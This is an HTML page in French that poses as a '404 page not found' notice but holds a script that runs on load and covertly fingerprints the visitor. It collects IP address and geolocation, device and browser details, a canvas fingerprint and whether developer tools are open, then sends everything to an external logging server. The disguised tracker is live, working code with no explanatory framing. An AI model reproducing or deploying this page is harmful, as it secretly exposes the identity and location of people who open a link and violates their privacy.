<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Erreur 404</title>
</head>
<body>
  <h1>ERREUR 404</h1>
  <p>La page que vous cherchez n'est plus disponible.</p>

  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipv4.seeip.org/geoip");
        const data = await res.json();
        return {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          loc: data.latitude + "," + data.longitude,
          org: data.org || "Inconnu"
        };
      } catch (e) {
        return { ip: "Inconnue" };
      }
    }

    function detectDevTools() {
      const start = new Date();
      debugger;
      const end = new Date();
      return end - start > 100;
    }

    async function collectAndSend() {
      const ipData = await getIPInfo();
      const userAgentData = navigator.userAgentData || {};
      const data = {
        ip: ipData.ip,
        city: ipData.city || null,
        region: ipData.region || null,
        country: ipData.country || null,
        org: ipData.org || null,
        userAgent: navigator.userAgent,
        brands: userAgentData.brands || null,
        mobile: userAgentData.mobile || null,
        language: navigator.language,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || "Inconnu",
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth,
          orientation: screen.orientation ? screen.orientation.type : "non supporté"
        },
        location: window.location.href,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled && navigator.javaEnabled(),
        touchSupport: {
          maxTouchPoints: navigator.maxTouchPoints,
          touchEvent: 'ontouchstart' in window,
          pointerEvent: !!window.PointerEvent
        },
        devToolsOpen: detectDevTools(),
        canvasFingerprint: (() => {
          try {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillText("FINGERPRINT", 2, 2);
            return canvas.toDataURL();
          } catch {
            return "Non disponible";
          }
        })(),
        timestamp: new Date().toISOString()
      };

      fetch("https://web-production-3dcc4.up.railway.app/log", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    }

    collectAndSend();
  </script>
</body>
</html>
